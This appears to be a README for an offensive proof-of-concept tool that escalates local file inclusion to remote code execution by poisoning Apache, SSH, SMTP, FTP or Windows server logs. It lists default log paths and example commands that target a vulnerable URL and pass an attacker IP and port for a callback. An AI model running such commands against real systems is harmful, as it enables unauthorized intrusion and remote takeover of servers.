# lfi2rce
Local File Inclusion To Remote Command Execution (PoC)  

```zsh
lfi2rce - Local File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*

Usage python3 lfi2rce <lfi vulnerable url> <poison type> <attacker ip> <attacker port>

Poison type options:

          apache       apache2 log poison          (default path: /var/log/apache2/access.log)
          ssh          ssh log poison              (default path: /var/log/auth.log)
          smtp         smtp log poison             (default path: /var/log/mail.log)
          ftp          ftp log poison              (default path: /var/log/vsftpd.log)
          windows      windows apache log poison   (default path: C:/xampp/apache/logs/access.log)

Examples:

          python3 lfi2rce "http://ghost.server/index.php?file=" apache 10.0.2.15 1337
          python3 lfi2rce "http://ghost.server/index.php?page=" ssh 10.0.2.15 1337
          python3 lfi2rce "http://ghost.server/index.php?search=" smtp 10.0.2.15 1337
          python3 lfi2rce "http://ghost.server/index.php?search=" ftp 10.0.2.15 1337
          python3 lfi2rce "http://ghost.winserver/index.php?s=" windows 10.0.2.15 1337
```

Note: smtp function can fail  
